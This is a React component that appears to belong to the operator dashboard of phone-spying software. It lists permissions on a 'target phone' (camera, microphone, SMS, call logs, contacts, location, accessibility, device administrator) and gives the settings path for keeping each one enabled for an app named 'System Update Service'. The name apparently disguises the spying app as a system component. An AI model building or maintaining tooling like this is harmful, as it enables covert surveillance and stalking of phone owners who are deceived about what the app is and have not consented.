import React from 'react';

export default function PermissionsCheck() {
  const permissions = [
    {
      name: 'Access Camera',
      status: 'On',
      path: 'Go to Settings > Apps > find System Update Service > Permissions > Camera > make sure it\'s on'
    },
    {
      name: 'Accessibility',
      status: 'On',
      path: 'Go to Settings > Accessibility > System Update Service > make sure it\'s on'
    },
    {
      name: 'Administrator',
      status: 'On',
      path: 'Go to Settings > find Security > Other security settings > Device administrator > System Update Service > make sure it\'s on'
    },
    {
      name: 'Calendar',
      status: 'On',
      path: 'Go to Settings > Apps > find System Update Service > Permissions > Calendar > make sure it\'s on'
    },
    {
      name: 'Call Logs',
      status: 'On',
      path: 'Go to Settings > Apps > find System Update Service > Permissions > Call logs > make sure it\'s on'
    },
    {
      name: 'Contacts',
      status: 'On',
      path: 'Go to Settings > Apps > find System Update Service > Permissions > Contacts > make sure it\'s on'
    },
    {
      name: 'Locations',
      status: 'On',
      path: 'Go to Settings > Apps > find System Update Service > Permissions > Locations > make sure it\'s on'
    },
    {
      name: 'Microphone',
      status: 'On',
      path: 'Go to Settings > Apps > find System Update Service > Permissions > Microphone > make sure i t\'s on'
    },
    {
      name: 'Notification',
      status: 'On',
      path: 'Go to Settings > Apps > find System Update Service > Permissions > Notifications > make sure it\'s on'
    },
    {
      name: 'SMS',
      status: 'On',
      path: 'Go to Settings > Apps > find System Update Service > Permissions > SMS > make sure it\'s on'
    }
  ];

  return (
    <div className="bg-white rounded-2xl shadow-xs border border-slate-200/80 p-6 min-h-[720px] flex flex-col space-y-6">
      {/* Top Header warning description text banner */}
      <div className="bg-slate-50 border border-slate-200/60 rounded-xl p-4 text-xs text-slate-500 leading-relaxed font-semibold">
        If the app is not working properly on the target phone, it may be that the permission is turned off. Go to Settings and enable them again to make the app function again.
      </div>

      {/* Permissions table log */}
      <div className="overflow-x-auto flex-1">
        <table className="w-full text-left border-collapse border border-slate-200 rounded-lg overflow-hidden">
          <thead>
            <tr className="border-b border-slate-200 text-[11px] font-bold text-slate-500 uppercase tracking-wider bg-slate-50">
              <th className="py-3 px-4 border-r border-slate-200">Permissions</th>
              <th className="py-3 px-4 border-r border-slate-200">Status</th>
              <th className="py-3 px-4">Path</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-slate-200 text-xs text-slate-700">
            {permissions.map((perm, idx) => (
              <tr key={idx} className="hover:bg-slate-50/50 transition-colors">
                <td className="py-3.5 px-4 font-bold text-slate-800 border-r border-slate-200 max-w-[200px]">{perm.name}</td>
                <td className="py-3.5 px-4 font-bold text-green-600 border-r border-slate-200">{perm.status}</td>
                <td className="py-3.5 px-4 text-slate-500 leading-relaxed">{perm.path}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}
